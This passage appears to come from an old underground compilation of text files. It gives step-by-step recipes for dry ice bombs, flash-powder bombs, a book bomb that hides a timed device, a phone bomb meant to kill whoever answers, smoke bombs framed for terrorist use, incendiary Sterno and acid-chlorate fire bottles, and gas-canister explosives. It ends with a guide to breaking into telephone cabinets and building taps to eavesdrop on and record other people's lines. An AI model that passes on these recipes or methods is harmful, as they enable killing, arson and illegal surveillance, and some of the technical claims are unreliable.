  loud "pop" and an even louder "Aarrggghhh!" within a minute, when  the CO2
  pressure becomes sufficient to blow off the lid.
     In a cluttered lab, this is doubly nasty because the mark will  proabably
  never figure out what made the noise.

2.  Put 2-3 inches of water in a 2-liter plastic pop bottle.  Put in  as many
  chunks of dry ice as possible before the smoke gets too thick.  Screw on the
  cap, place in an appropriate area, and run like hell.  After about a minute
  (your mileage may vary), a huge explosion will  result, spraying water
  everywhere, along with what's left of the 2-liter bottle.

More things to do with Dry Ice:

   Has anyone ever thrown dry ice into a public pool?  As long as you chuck it
into the bottom of the deep end, it's safe, and it's really impressive if the
water is warm enough

     "Fun stuff. It SCREAMS when it comes into contact with metal..."
     "You can safely hold a small piece of dry ice in your mouth if you  
     KEEP IT MOVING CONSTANTLY. It looks like you're smoking or on fire."

       Editor's Note:   Dry ice can be a lot of fun, but be forewarned:

    Using anything but plastic to contain dry ice bombs is suicidal.  Dry ice
is more dangerous than TNT, because it's extremely unpredictable.  Even a
2-liter bottle can produce some nasty shrapnel:  One source tells me that he
caused an explosion with a 2-liter bottle that destroyed a metal garbage can.
In addition, it is rumored that several kids have been killed by shards of
glass resulting from the use of a glass bottle. For some reason, dry ice bombs
have become very popular in the state of Utah. As a result, dry ice bombs have
been classified as infernal devices, and possession is a criminal offense.

--FILM CANISTERS 2               (Originally By Bill)

For a relatively low shrapnel explosion, I suggest pouring it into an empty
35mm film cannister.  Poke a hole in the plastic lid for a fuse.  These
goodies make an explosion audible a mile away easily.

1) Poke the hole before putting the flash powder into the cannister.
2) Don't get any powder on the lip of the cannister.
3) Only use a very small quantity and work your way up to the desired
   result.                  
4) Do not pack the powder, it works best loose.
5) Do not grind or rub the mixture - it is friction sensitive.
6) Use a long fuse.

--BOOK BOMBS                                    Exodus


     Concealing a bomb can be extremely difficult in a day and age where
perpetrators of violence run wild.  Bags and briefcases are often searched by
authorities whenever one enters a place where an individual might intend to
set off a bomb.  One approach to disguising a bomb is to build what is called
a book bomb; an explosive device that is entirely contained inside of a book.

     Usually, a relatively large book is required, and the book must be of the
hardback variety to hide any protrusions of a bomb.  Dictionaries, law books,
large textbooks, and other such books work well.  When an individual makes a
bookbomb, he/she must choose a type of book that is appropriate for the place
where the book bomb will be placed.  The actual construction of a book bomb
can be done by anyone who possesses an electric drill and a coping saw. First,
all of the pages of the book must be glued together.  By pouring an entire
container of water-soluble glue into a large bucket, and filling the bucket
with boiling water, a glue-water solution can be made that will hold all of
the book's pages together tightly.  After the glue-water solution has cooled
to a bearable temperature, and the solution has been stirred well, the pages
of the book must be immersed in the glue-water solution, and each page must be
thoroughly soaked.

   It is extremely important that the covers of the book do not get stuck to
the pages of the book while the pages are drying. Suspending the book by both
covers and clamping the pages together in a vise works best.  When the pages
dry, after about three days to a week, a hole must be drilled into the now
rigid pages, and they should drill out much like wood. Then, by inserting the
coping saw blade through the pages and sawing out a rectangle from the middle
of the book, the individual will be left with a shell of the book's pages. The
pages, when drilled out, should look like this:

               ________________________
               | ____________________ |
               | |                  | |
               | |                  | |
               | |                  | |
               | |                  | |
               | |                  | |

               |______________________|

                 (book covers omitted)

     This rectangle must be securely glued to the back cover of the book.
After building his/her bomb, which usually is of the timer or radio controlled
variety, the bomber places it inside the book.  The bomb itself, and whatever
timer or detonator is used, should be packed in foam to prevent it from
rolling or shifting about.  Finally, after the timer is set, or the radio
control has been turned on, the front cover is glued closed, and the bomb is
taken to its destination.



---PHONE BOMBS                                        -= Exodus =-

     The phone bomb is an explosive device that has been used in the past to
kill or injure a specific individual.  The basic idea is simple: when the
person answers the phone, the bomb explodes.  If a small but powerful high
explosive device with a squib was placed in the phone receiver, when the
current flowed through the receiver, the squib would explode, detonating the
high explosive in the person's hand.  Nasty.  All that has to be done is
acquire a squib, and tape the receiver switch down.

 Unscrew the mouthpiece cover, and remove the speaker, and connect the squib's
leads where it was. Place a high explosive putty, such as C-1 (see section
3.31) in the receiver, and screw the cover on, making sure that the squib is
surrounded by the C-1. Hang the phone up, and leave the tape in place.

  When the individual to whom the phone belongs attempts to answer the phone,
he will notice the tape, and remove it.  This will allow current to flow
through the squib.  Note that the device will not explode by merely making a
phone call; the owner of the phone must lift up the receiver, and remove the
tape.  It is highly probable that the phone will be by his/her ear when the
device explodes...

--IMPROVED PHONE BOMB          

    The above seems overly complicated to me... it would be better to rig the
device as follows:

  _________            FIRST UNPLUG THE PHONE FROM THE WALL
 /|-------|\  Wire the detonator IN LINE with the wires going to the earpiece,
 ~  |  |   ~  (may need to wire it with a relay so the detonator can receive
  @@@@@@@@    the full line power, not just the audio power to the earpiece)
 @@@@@@@@@@
 @@@@@@@@@@   Pack C4 into the phone body (NOT the handset) and plug it back
             in. When they pick up the phone, power will flow through the
             circuit to the detonator....




SMOKE BOMBS 4.14                                    -= Exodus =-


     One type of pyrotechnic device that might be employed by a terrorist in
many way would be a smoke bomb.  Such a device could conceal the getaway
route, or cause a diversion, or simply provide cover.  Such a device, were it
to produce enough smoke that smelled bad enough, could force the evacuation of
a building, for example.  Smoke bombs are not difficult to make.  Although the
military smoke bombs employ powdered white phosphorus or titanium compounds,
such materials are usually unavailable to even the most well-equipped
terrorist. Instead, he/she would have to make the smoke bomb for themselves.

     Most homemade smoke bombs usually employ some type of base powder, such
as black powder or pyrodex, to support combustion.  The base material will
burn well, and provide heat to cause the other materials in the device to
burn, but not completely or cleanly.  Table sugar, mixed with sulfur and a
base material, produces large amounts of smoke.  Sawdust, especially if it has
a small amount of oil in it, and a base powder works well also.  Other
excellent smoke ingredients are small pieces of rubber, finely ground
plastics, and many chemical mixtures.  The material in road flares can be
mixed with sugar and sulfur and a base powder produces much smoke.  Most of
the fuel-oxodizer mixtures, if the ratio is not correct, produce much smoke
when added to a base powder.  The list of possibilities goes on and on.  The
trick to a successful smoke bomb also lies in the container used.  A plastic
cylinder works well, and contributes to the smoke produced.  The hole in the
smoke bomb where the fuse enters must be large enough to allow the material to
burn without causing an explosion.  This is another plus for plastic
containers, since they will melt and burn when the smoke material ignites,
producing an opening large enough to prevent an explosion.

--SIMPLE SMOKE                           

  The following reaction should produce a fair amount of smoke.  Since this
 reaction is not all that dangerous you can use larger amounts if necessary

 6 pt. ZINC POWDER
 1 pt. SULFUR POWDER
                       Insert a red hot wire into the pile, step back.


---COLORED FLAMES

     Colored flames can often be used as a signaling device for terrorists. by
putting a ball of colored flame material in a rocket; the rocket, when the
ejection charge fires, will send out a burning colored ball.  The materials that
produce the different colors of flames appear below.

COLOR               MATERIAL                        USED IN

red                 strontium                      road flares,                  
                    salts                          red sparklers
                   (strontium
                     nitrate)

green               barium salts                   green sparklers               
                   (barium nitrate)

yellow              sodium salts                   gold sparklers                
                  (sodium nitrate)

blue                powdered copper                blue sparklers,               
                    old pennies

white               powdered magnesium             firestarters,                 
                    or aluminum                    aluminum foil

purple              potassium permanganate         purple fountains,             
                                                   treating sewage

                          ** FIRECRACKERS **

     A simple firecracker can be made from cardboard tubing and epoxy. The
instructions are below:

1) Cut a small piece of cardboard tubing from the tube you are using.
   "Small" means anything less than 4 times the diameter of the tube.

2) Set the section of tubing down on a piece of wax paper, and fill it with
   epoxy and the drying agent to a height of 3/4 the diameter  of the tubing.
   Allow the epoxy to dry to maximum hardness, as specified on the package.

3) When it is dry, put a small hole in the middle of the tube, and insert a
   desired length of fuse.

4) Fill the tube with any type of flame-sensitive explosive.  Flash powder,
   pyrodex, black powder, potassium picrate, lead azide, nitrocellulose, or
   any of the fast burning fuel-oxodizer mixtures will do nicely.  Fill the
   tube almost to the top.

5) Pack the explosive tightly in the tube with a wad of tissue paper and a
   pencil or other suitable ramrod.  Be sure to leave enough space for more
   epoxy.

6)  Fill the remainder of the tube with the epoxy and hardener, and allow it
    to dry.

7) For those who wish to make spectacular firecrackers, always use flash
   powder, mixed with a small amount of other material for colors. By crushing
   the material on a sparkler, and adding it to the flash powder, the
   explosion will be the same color as the sparkler.   By adding small chunks
   of sparkler material, the device will throw out colored burning sparks, of
   the same color as the sparkler.  By adding powdered iron, orange sparks
   will be produced. White sparks can be produced from magnesium shavings, or
   from small, LIGHTLY crumpled balls of aluminum foil.

        Example:  Suppose I wish to make a firecracker that will explode         
      with a red flash, and throw out white sparks.

        First, I would take a road flare, and finely powder the material
   inside it.   Or, I could take a red sparkler, and finely powder it.

    Then, I would mix a small amount of this material with the flash powder.
   (NOTE: FLASH POWDER MAY REACT WITH SOME MATERIALS THAT IT IS MIXED WITH,
   AND EXPLODE SPONTANEOUSLY!)  I would mix it in a ratio of 9 parts flash
   powder to 1 part of flare or sparkler material, and add about 15 small
   balls of aluminum foil I would store the material in a plastic bag
   overnight outside of the house, to make sure that the stuff doesn't react.
   Then, in the morning, I would test a small amount of it, and if it was
   satisfactory, I would put it in the firecracker.

8) If this type of firecracker is mounted on a rocket engine, professional to
    semi-professional displays can be produced.


--SKYROCKETS

     An impressive home made skyrocket can easily be made in the home from
model rocket engines.  Estes engines are recommended.

1) Buy an Estes Model Rocket Engine of the desired size, remembering that
   the power doubles with each letter.  (See sect. 6.1 for details)

2) Either buy a section of body tube for model rockets that exactly fits the
   engine, or make a tube from several thicknesses of paper and glue.

3) Scrape out the clay backing on the back of the engine, so that the powder
   is exposed.  Glue the tube to the engine, so that the tube covers at least
   half the engine.  Pour a small charge of flash powder in the tube, about
   1/2 an inch.

4) By adding materials as detailed in the section on firecrackers, various
   types of effects can be produced.

5) By putting Jumping Jacks or bottle rockets without the stick in the tube,
   spectacular displays with moving fireballs or M.R.V.'s can be produced.

     6) Finally, by mounting many home made firecrackers on the tube with the
       fuses in the tube, multiple colored bursts can be made.


---ROMAN CANDLES

     Roman candles are impressive to watch.  They are relatively difficult to
make, compared to the other types of home-made fireworks, but they are well
worth the trouble.

1) Buy a 1/2 inch thick model rocket body tube, and reinforce it with several
   layers of paper and/or masking tape.  This must be done to prevent the tube
   from exploding.  Cut the tube into about 10 inch lengths.

2) Put the tube on a sheet of wax paper, and seal one end with epoxy and the
   drying agent.  About 1/2 of an inch is sufficient.

3) Put a hole in the tube just above the bottom layer of epoxy, and insert a
   desired length of water proof fuse.  Make sure that the fuse fits tightly.

4) Pour about 1 inch of pyrodex or gunpowder down the open end of the tube.

5) Make a ball by powdering about two 6 inch sparklers of the desired color.
   Mix this powder with a small amount of flash powder and a small amount of
   pyrodex, to have a final ratio (by volume) of 60% sparkler material / 20%
   flash powder / 20% pyrodex.  After mixing the powders well, add water, one
   drop at a time, and mixing continuously, until a damp paste is formed.

   This paste should be moldable by hand, and should retain its shape when
   left alone. Make a ball out of the paste that just fits into the tube.
   Allow the ball to dry.

6) When it is dry, drop the ball down the tube.  It should slide down fairly
   easily.  Put a small wad of tissue paper in the tube, and pack it gently
   against the ball with a pencil.

7) When ready to use, put the candle in a hole in the ground, pointed in a
   safe direction, light the fuse, and run.  If the device works, a colored
   fireball should shoot out of the tube to a height of about 30 feet.  This
   height can be increased by adding a slightly larger powder charge in step
   4, or by using a slightly longer tube.

8) If the ball does not ignite, add slightly more pyrodex in step 5.

9) The balls made for roman candles also function very well in rockets,
   producing an effect of falling colored fireballs.

		%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%		
			   Sterno Bombs
		%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Today boys and girls we will tell you all about having fun with a few
simple items that you can buy easily or may even have in your home.
Since most of you are simple-minded, uncoordinated morons, I will start
you out slowly and simply (like you).
Our first project is a sure fire way to be the life of the party.  Real
sure fire.  This item is called a "Handy House Warmer."  All you need are
three items which can easily be obtained.  The first item is a roll of
electrical tape (starts easy).  Second, a large can of Sterno, easily
bought at any camping or hardware store.  Third, an M-80 or other similar
explosive plaything.
Step one in the construction of our pyrotecnic wonder is to remove the top
of the sterno and, using an ice pick or other sharp item, punch a hole in
the top of the can.  Step two is placing the M-80 into the sterno gel.
Make sure it is well covered by the gel.  Step three is to replace the
cap, making sure to thread the M-80 fuse through the hole in the cap.
After securing the lid tightly on the can, you can start the final phase
to fun.  The last step is simply to wind tape tightly around the entire
can, making sure to cover it completely with at least three layers of tape
but not more than six layers.
Now, as you can tell, when you go to use our incendiary toy to cheaply and
efficiently heat any home in your neighborhood, all you have to do is
light the fuse and run.  The other advantages of this are that Sterno
sticks to almost anything and is very difficult to put out, needing to be
completely smothered, and that Sterno is highly prone to reignition (very
similar to napalm).  This type of firecracker is handy in small areas such
as inside cars, small rooms, phone booths, rectums, etc...
Now, I am not advocating the use of this item for anything but your own
personal fireworks displays and enjoyment, but where and what you call
enjoyment I won't judge.
Well, boys and girls, that's all for today.  Hope you enjoyed our time
together and remember my motto:  DEATH IS JUST A STATE OF MIND.


		New for the ACB 5           -=={ RFLAGG }==-  CHEMICAL FIRE BOTTLE

     The chemical fire bottle is really an advanced molotov cocktail.  Rather
than using the burning cloth to ignite the flammable liquid, which has at best
a fair chance of igniting the liquid, the chemical fire bottle utilizes the
very hot and violent reaction between sulfuric acid and potassium chlorate.
When the container breaks, the sulfuric acid in the mixture of gasoline sprays
onto the paper soaked in potassium chlorate and sugar.  The paper, when struck
by the acid, instantly bursts into a white flame, igniting the gasoline.  The
chance of failure to ignite the gasoline is less than 2%, and can be reduced
to 0%, if there is enough potassium chlorate and sugar to spare.


     MATERIALS                         EQUIPMENT
                              
     potassium chlorate               12 oz.glass bottle
     (2 teaspoons)

     sugar (2 teaspoons)              cap for bottle, w/plastic inside               

     conc. sulfuric acid (4 oz.)      cooking pan with raised edges

     gasoline (8 oz.)                 paper towels

                                      glass or plastic cup and spoon

1) Test the cap of the bottle with a few drops of sulfuric acid to make sure
   that the acid will not eat away the bottle cap during storage.  If the acid
   eats through it in 24 hours, a new top must be found and tested, until  a
   cap that the acid does not eat through is found.  A glass top is excellent.

2) Carefully pour 8 oz. of gasoline into the glass bottle.

3) Carefully pour 4 oz. of concentrated sulfuric acid into the glass bottle.
   Wipe up any spills of acid on the sides of the bottle, and screw the cap on
   the bottle.  Wash the bottle's outside with plenty of water.  Set it aside
   to dry.

4) Put about two teaspoons of potassium chlorate and about two teaspoons of
   sugar into the glass or plastic cup.  Add about 1/2 cup of boiling water,
   or enough to dissolve all of the potassium chlorate and sugar.

5) Place a sheet of paper towel in the cooking pan with raised edges.  Fold
   the paper towel in half, and pour the solution of dissolved potassium
   chlorate and sugar on it until it is thoroughly wet.  Allow the towel to
   dry.

6) When it is dry, put some glue on the outside of the glass bottle containing
   the gasoline and sulfuric acid mixture.  Wrap the paper towel around the
   bottle, making sure that it sticks to it in all places.  Store the bottle
   in a place where it will not be broken or tipped over.

7) When finished, the solution in the bottle should appear as two distinct
   liquids, a dark brownish-red solution on the bottom, and a clear solution
   on top.  The two solutions will not mix.  To use the chemical fire bottle,
   simply throw it at any hard surface.

8) NEVER OPEN THE BOTTLE, SINCE SOME SULFURIC ACID MIGHT BE ON THE CAP, WHICH
   COULD TRICKLE DOWN THE SIDE OF THE BOTTLE AND IGNITE THE POTASSIUM
   CHLORATE, CAUSING A FIRE AND/OR EXPLOSION.

9) To test the device, tear a small piece of the paper towel off the bottle,
   and put a few drops of sulfuric acid on it.  The paper towel should
   immediately burst into a white flame.


  BOTTLED GAS EXPLOSIVES

     Bottled gas, such as butane for refilling lighters, propane for propane
stoves or for bunsen burners, can be used to produce a powerful explosion. To
make such a device, all that a simple-minded anarchist would have to do would
be to take his container of bottled gas and place it above a can of Sterno or
other gelatinized fuel, light the fuel and run. Depending on the fuel used,
and on the thickness of the fuel container, the liquid gas will boil and
expand to the point of bursting the container in about five minutes.

 In theory, the gas would immediately be ignited by the burning gelatinized
fuel, producing a large fireball and explosion. Unfortunately, the bursting of
the bottled gas container often puts out the fuel, thus preventing the
expanding gas from igniting.  By using a metal bucket half filled with
gasoline, however, the chances of ignition are better, since the gasoline is
less likely to be extinguished.  Placing the canister of bottled gas on a bed
of burning charcoal soaked in gasoline would probably be the most effective
way of securing ignition of the expanding gas, since although the bursting of
the gas container may blow out the flame of the gasoline, the burning charcoal
should immediately re-ignite it.  Nitrous oxide, hydrogen, propane, acetylene,
or any other flammable gas will do nicely.

  During the recent gulf war, fuel/air bombs were touted as being second only
to nuclear weapons in their devastating effects. These are basically similar
to the above devices, except that an explosive charge is used to rupture the
fuel container and disperse it over a wide area. a second charge is used to
detonate the fuel. The reaction is said to produce a massive shockwave and to
burn all the oxygen in a large area, causing suffocation.

  Another benefit of a fuel-air explosive is that the gas will seep into
fortified bunkers and other partially-sealed spaces, so a large bomb placed in
a building would result in the destruction of the majority of surrounding
rooms, rendering it structurally unsound.

How Ma Bell Works                               by the Jolly Roger
        
In  this  article,  I  will first describe  the  termination,  
wiring,  and  terminal  hardware most commonly used in  the  Bell  
system, and I will include section on methods of using them. 
     ------------- 
     LOCAL NETWORK 
     ------------- 
The   local   telephone   network   between   the    central  
office/exchange  and  the  telephone subscribers can  be  briefly  
described as follows: 
From  the  central office (or local exchange) of  a  certain  
prefix(es), underground area trunks go to each area that has that  
prefix  (Usually  more than one prefix per area.)  At  every  few  
streets or tract areas, the underground cables surface. They then  
go to the telephone pole (or back underground,  depending on  the  
area)  and  then  to the subsribers house (or in the case  of  an  
apartment building or mutliline business,  to a splitter or  dis- 
tribution box/panel).  
Now  that  we have the basics,  I'll try and go in-depth  on  the  
subject. 
    ------------------ 
    UNDERGROUND CABLES 
    ------------------ 
These  are sometimes inter-office trunks,  but usually in  a  
residential  area they are trunk lines that go to bridging  heads  
or  distribution  cases.  The cables are about 2-3  inches  thick  
(varies),  and  are  either  in  a metal  or  pvc-type  pipe  (or  
similiar).  Rarely (maybe not in some remote rural areas) are the  
cables  just 'alone' in the ground.   Instead they are usually in  
an  underground cement tunnel (resembles a small sewer or  storm- 
drain.)   The manholes are >heavy< and will say 'Bell system'  on  
them.  they can be opened with a 1/2 inch wide crowbar (Hookside)  
inserted  in the top rectangular hole.  There are ladder rungs to 
help you climb down.  You will see  the cable  pipes on the wall, 
with the blue and white striped one being  the inter-office trunk 
(at  least  in my  area).  The others  are local  lines,  and are 
usually marked or color  coded.  There is almost  always a posted 
color code  chart on the wall, not to mention  Telco manuals de- 
scribing the cables and terminals, so I need not get into detail. 
Also, there is usually  some kind  of  test equipment,  and often 
Bell test sets are  left  in there. 
       -------------- 
       BRIDGING HEADS 
       -------------- 
The  innocent-looking  grayish-green boxes.   These  can  be  
either trunk bridges or bridging for residences.  The major trunk  
bridging  heads  are usually larger,  and they have the  'Western  
Electric' logo at the bottom,  whereas the normal bridging  heads  
(which  may  be different in some areas-depending on the  company  
you are served by.  GTE B.H.'s look slightly different.  Also, do  
not  be  fooled by sprinkler boxes!)  They can be found  in  just  
about every city. 
To open a bridging head: if it is locked (and you're feeling  
destructive),  put a hammer or crowbar (the same one you used  on  
the  manhole) in the slot above the top hinge of the right  door.   
Pull hard, and the door will rip off. Very effective! If it isn't 
locked (as usual),  take a 7/8 inch hex socket and with it,  turn 
the bolt  about 1/8 of a turn  to the  right  (you  should hear a 
spring release inside). Holding the bolt, turn the handle all the 
way to the left and pull out. 
To Check for a test-set (which are often left by Bell employees), 
go inside - First check  for a test-set  (which  are  often  left  
by  Bell  employees).   There should be a panel of terminals  and  
wires.   Push the panel back about an inch or so,  and rotate the  
top  latch  (round with a flat section)  downward.   Release  the  
panel  and it will fall all the way forward.  There is usually  a  
large  amount  of wire and extra terminals.   The  test-sets  are  
often hidden here,  so don't overlook it (Manuals,  as  well,  are  
sometimes placed in the head).   On the right door is a metal box  
of alligator clips.   Take a few (Compliments of Bell.).  On each  
door is a useful little round metal device. (Says 'insert gently'  
or'  clamp  gently - do not overtighten' etc..)  On the front  of  
the disc, you should find two terminals.  These are for your test  
set.   (If you dont have one, dont despair -I'll show you ways to  
make basic test sets later in this article). 
Hook the ring (-) wire to the 'r' terminal;  and the tip (+)  
wire  to the other.  (By the way,  an easy way to  determine  the  
correct polarity is with a 1.5v LED.   Tap it to the term.  pair,  
if  it  doesnt light,  switch the poles until it does.   When  it  
lights,find the longer of the two LED poles:  This one will be on  
the  tip wire (+).   Behind the disc is a coiled  up  cord.  This  
should have two alligator clips on it..  Its very useful, because  
you dont have to keep connecting and disconnecting the fone (test  
set) itself, and the clips work nicely. 
On  the  terminal  board,  there should be  about  10  screw  
terminals  per  side.   Follow the wires,  and you can see  which  
cable pairs are active.  Hook the clips to the terminal pair, and  
you're set!   Dial out if you want,  or just listen (If someone's  
on theline).  Later,  I'll show you a way to set up a true  'tap'  
that  will let the person dial out on his line and receive  calls  
as normal, and you can listen in the whole time.  More about this  
later... 
On  major  prefix-area bridging heads,  you can  see  'local  
loops' ,which are two cable pairs (cable pair = ring+tip,  a fone  
line)  that are directly connected to each other on the  terminal  
board.   These  'cheap  loops' as they are called,  do  not  work  
nearLy  as  well  as the existing ones set up  in  the  switching  
hardware  at the exchange office.   (Try scanning your  prefixes'  
00xx  to 99xx #'s.)  The tone sides will announce themselves with  
the 1008 hz loop tone,  and the hang side will give no  response.   
The  first  person  should dial the 'hang' side,  and  the  other  
person dial the tone side,  and the tone should stop if you  have  
got the right loop.) 
If  you want to find the number of the line that you're  on,  
you  can either try to decipher the 'bridging log' (or whatever),  
which is on the left door.  If that doesnt work,  you can use the  
follwing: 
     --------------------------- 
     ANI # (Automatic Number ID) 
     --------------------------- 
This  is a Telco test number that reports to you the  number  
that youre calling from (It's the same, choppy 'Bell bitch' voice  
that you get when you reach a disconnected #)  
For the   213 NPA - Dial 1223 
          408 NPA - Dial 760 
          914 NPA - Dial 990 
These  are  extremely useful when messing with any  kind  of line
terminals, house boxes, etc. 
Now that we have bridging heads wired, we can go on... (don't  
forget to close and latch the box after all... Wouldnt want GE  
and Telco people mad, now, would we?)  
     ------------------------------------- 
     "CANS" - Telephone Distribution Boxes 
     ------------------------------------- 

Basically, two types: 
1> Large, rectangular silver box at the end of each street. 
2> Black, round, or rectangular thing at every telephone pole. 
Type 1 -   This is the case that takes the underground cable from  
the  bridge and runs it to the telephone pole cable (The  lowest,  
largest  one  on the telephone pole.)  The box is always  on  the  
pole nearest the briging head, where the line comes up.  Look for  
the 'Call before you Dig - Underground cable' stickers.. 
The  case box is hinged,  so if you want to climb the  pole,  
you  can open it with no problems.   These usually have 2 rows of  
terminal sets.  
You  could try to impersonate a Telco technician and  report  
the  number as 'new active' (giving a fake name and fake  report,  
etc.)   I  dont recommend this,  and it  probably  won't  (almost  
positively won't) work,  but this is basically what Telco linemen  
do). 
Type  2 - This is the splitter box for the group of houses around  
the  pole  (Usually  4 or 5 houses).   Use it  like  I  mentioned  
before.   The terminals (8 or so) will be in 2 horizontal rows of  
sets.   The  extra  wires  that  are  just  'hanging  there'  are  
provisions for extra lines to residences (1 extra line per house,  
thats  why  the insane charge for line #3!)  If its the  box  for  
your  house  also,  have fun and swap lines with  your  neighbor! 
'Piggyback'  them  and  wreak havoc  on  the  neighborhood  (It's  
eavesdropping  time...)  Again,  I don't recommend this,  and its  
difficult to do it correctly.  Moving right along... 
     ------------------------------ 
     APARTMENT / BUSINESS MULTILINE 
           DISTRIBUTION BOXES 
     ------------------------------ 
Found  outside the buliding (most often on the  right  side,  
but not always...   Just follow the wire from the telephone pole)  
or  in the basement.   It has a terminal for all the lines in the  
building.   Use it just like any other termination box as before.  
Usually says 'Bell system' or similar.  Has up to 20 terminals on  
it (usually.) the middle ones are grounds (forget   these).   The  
wires come from the cable to one row (usually the left one), with 
the other row of terminals for the other row of terminals for the  
building  fone wire pairs.   The ring (-) wire is usually the top  
terminal if the set in the row (1 of 10 or more),  and the tip is  
in the clamp/screw below it.  This can be reversed, but the cable  
pair is always terminated one-on-top-of-each- other,  not on  the  
one  next  to  it.  (I'm  not sure why the other  one  is  there,  
probably as aprovision for extra lines) Don't use it  though,  it  
is usually to close to the other terminals, and in my experiences  
you get a noisy connection. 
Final note:  Almost every apartment, business, hotel, or anywhere  
there   is  more  than  2  lines  this  termination  lines   this  
termination method is used.  If you can master this type, you can  
be  in control of many things...   Look around in your area for a  
building  that  uses this type,  and practice hooking up  to  the  
line, etc. 
As  an  added  help,here is the basic  'standard'  color-code  for  
multiline terminals/wiring/etc... 
Single line:  Red = Ring 
            Green = Tip 
           Yellow = Ground * 
*  (Connected  to  the ringer coil  in  individual  and  bridged  
    ringer   phones (Bell only)  Usually  connected to the  green  
    (Tip) 
Ring (-) = Red 
           White/Red Stripe 
           Brown 
           White/Orange Stripe 
           Black/Yellow Stripe 
Tip (+) =  Green (Sometimes 
            yellow, see above.) 
           White/Green Stripe 
           White/Blue Stripe 
           Blue 
           Black/White Stripe 
Ground =   Black 
           Yellow 
      ---------------------- 
      RESIDENCE TERMINAL BOX 
      ---------------------- 
Small,  gray (can be either a rubber (Pacific Telephone) or  hard 
plastic  (AT & T) housing deal that connects the cable pair  from  
the  splitter box (See type 2,  above) on the pole to your  house  
wiring.  Only 2 (or 4, the 2 top terminals are hooked in parallel  
with the same line) terminals, and is very easy to use.  This can  
be  used to add more lines to your house or add an external  line  
outside the house. 
      --------- 
      TEST SETS 
      --------- 
Well,  now  you  can  consider  yourself a minor  expert  on  the  
terminals and wiring of the local telephone network.  Now you can  
apply  it  to whatever you want to do..  Here's another  helpful  
item: 
How  to  make  a Basic Test-Set and how to use it  to  dial  out,  
eavsdrop, or seriously tap and record line activity. 
These are  the  (usually) orange hand set fones  used  by  Telco  
technicians to test lines.   To make a very simple one,  take any  
Bell (or other,  but I recommend a good Bell fone like a princess  
or a trimline. gte flip fones work excllently, though..) fone and  
follow the instructions below. 
Note:    A 'black box' type fone mod will let you tap into  their  
line,  and with the box o,  it's as if you werent there. they can  
recieve  calls and dial out,  and you can be listening the  whole  
time! very useful.  With the box off, you have a normal fone test  
set. 
Instructions: 
A  basic black box works well with good results.   Take the cover  
off  the fone to expose the network box (Bell type  fones  only).   
The <RR> terminal should have a green wire going to it (orange or  
different  if  touch tone - doesnt matter,  its the same  thing).  
Disconnect the wire and connect it to one pole of an SPST switch.   
Connect  a  piece  of wire to the other pole of  the  switch  and  
connect it to the <RR> terminal.   Now take a 10k hm 1/2 watt 10%  
resistor  and  put  it  between the <RR>  terminal  ad  the  <F>  
terminal,  which  should have a blue and a white wire going to it  
(different for touch tone).  It should look like this: 
-----Blue wire----------<F> 
                   ! 
----White wire-----! 
                   ! 
              10k Resistor 
                   ! 
                   ! 
--Green wire--     !----<RR> 
              !    ! 
               SPST 
What  this  does in effect is keep the hookswitch  /  dial  pulse  
switch (F to RR loop) open while holding the line high with  the  
resistor.   This gives the same voltage effect as if the fone was  
'on-hook',  while  the 10k ohms holds the voltage right above the  
'off hook' threshold (around 22 volts or so, as compared to 15-17   
or normal off hook 48 volts for normal 'on-hook'), giving 
Test Set Version 2.
Another  design is similar to the 'type 1' test set (above),  
but has some added features:
From >----------------Tip------<To Test 
Alligator                        set 
Clip >----------------Ring-----<phone 
            !                ! 
            x                ! 
            !                ! 
            o                ! 
            !    x---RRRRR---! 
            !   x            ! 
            !---x            ! 
                 x----0------! 
x    = Spst Switch 
o    = Red LOD        0   = Green LED 
RRRRR= 1.8k 1/2 watt  xxxx= Dpst switch 
        resistor 
When the SPST switch in on, the LED will light, and the fone  
will become active.   The green light should be on.  If it isn't,  
switch  the dpst.   If it still isnt,  check the polarity of  the  
line and the LEDs.   With both lights on, hang up the fone.  They  
should all be off now.   Now flip the dpst and pick up the  fone.   
The  red  LED shold be on,  but the green shouldnt.   If  it  is,  
something is wrong with the circuit.  You wont get a dial tone if  
all is correct. 
When  you  hook  up  to the line with  the  alligator  clips  
(Assuming you have put this circuit inside our fona and have  put  
alligator clips on the ring and tip wires (As we did before)) you  
should  have the spst #1 in the off posistion.  This will greatly  
reduce the static noise involved in hooking up to a line. The red  
LED can also be used to check if you have the correct polarity. 
With  this  fone you will have the ability to listen  in  on  
>all< audible line activity,  and the people (the 'eavesdropees')  
can use their fone as normal. 
Note that test sets #1 and #2 have true 'black boxes', and can be  
used for free calls (see an article about black boxes). 

Test Set Version 3 

To do test set 3: 
Using a trimline (or similar) phone, remove the base and cut  
all  of  the wire leads off except for the red (ring -)  and  the  
green  (tip +).   Solder alligator clips to the  lug.   The  wire  
itself  is  'tinsel' wrapped in rayon,  and doesnt solder  well.   
Inside  the one handset,  remove the light socket (if it has one)  
and install a small slide or  toggle switch (Radio Shack's micro-  
miniature  spst works well).   Locate the connection of the  ring  
and the tip wires on the pc board near where the jack is  located  
at the bottom of the handset.  (The wires are sometimes black or  
brow instead of red and green,  respectively).   Cut the foil and  
run 2 pieces of wire to your switch.  In parallel with the switch  
add  a .25 uf 200 VDC capacitor (mylar,  silvered mica,  ceramic,  
not  an electrolytic).  When the switch is  closed,  the  handset  
functions normally.   With the switch in the other position,  you  
can listen without being heard. 
Note:  To  reduce the noise involved in connecting the clips to a  
line,  add  a  switch selectable 1000 ohm 1/2  watt  resistor  in  
series with the tip wire. Flip it in circuit when connecting, and  
once on the line, flip it off again. (or just use the 'line disc-  
onect'  type  switch as in the type 2 test  set  (above)).   Also  
avoid   touching the alligator clips to any metal parts or  other  
terminals,  for  i causes static on the line and raises  poeple's  
suspicions.  
      --------- 
      RECORDING 
      --------- 
If you would like to record any activity,  use test set 1 or  
2  above  (for unattended recording of >all< line  activity),  or  
just  any test set if you are going to be there to  monitor  when  
they are dialing, talking, etc.  
Place  a  telephone pickup coil (I recommend the Becoton  T-5  TP  
coil  or equivalent) onto the test set,  and put the TP plug into  
the mic.  jack of any standard tape recorder.  Hit play, rec, and  
pause.   Alternate  pause when you want to record (I  dont  think  
anyone should have any difficulty with this at all...) 
Well,  if  you  still can't make a test set or you dont have  the  
parts, there's still hope.  Alternate methods:          
1>  Find  a  bell test set in a manhole or a  bridging  head  and  
'Borrow it indefinately... 
2>  Test sets can  be  purchased from: 
    Techni-Tool 
    5 Apollo Road 
